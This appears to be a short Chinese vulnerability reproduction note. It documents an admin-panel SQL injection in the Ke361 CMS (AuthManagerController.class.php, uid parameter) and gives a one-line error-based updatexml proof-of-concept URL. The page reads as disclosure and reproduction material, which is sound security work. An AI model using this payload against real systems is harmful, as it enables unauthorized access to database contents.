# Ke361 AuthManagerController.class.php 后台SQL注入漏洞

## 漏洞描述

Ke361 AuthManagerController.class.php uid参数存在 SQL注入漏洞，通过漏洞可以获取数据库敏感信息

## 漏洞影响

<a-checkbox checked>Ke361</a-checkbox></br>

## 环境搭建

<a-checkbox checked>https://gitee.com/jcove/ke361</a-checkbox></br>

## 漏洞复现

CMS产品页面

![img](../../../.vuepress/public/img/1634130579841-e981591e-46f6-4aa8-bc68-6fe39d1e4e35-20220313232823896.png)

存在漏洞的文件为 `Application/Admin/Controller/AuthManagerController.class.php`

![img](../../../.vuepress/public/img/1634142335709-0384ef5c-e05b-41af-b19d-a5b7864faaf3.png)

验证POC

```php
/admin.php?s=/AuthManager/group/uid/1')%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+
```

![img](../../../.vuepress/public/img/1634142341220-a0120691-16d8-41e2-be07-abcaa561347f.png)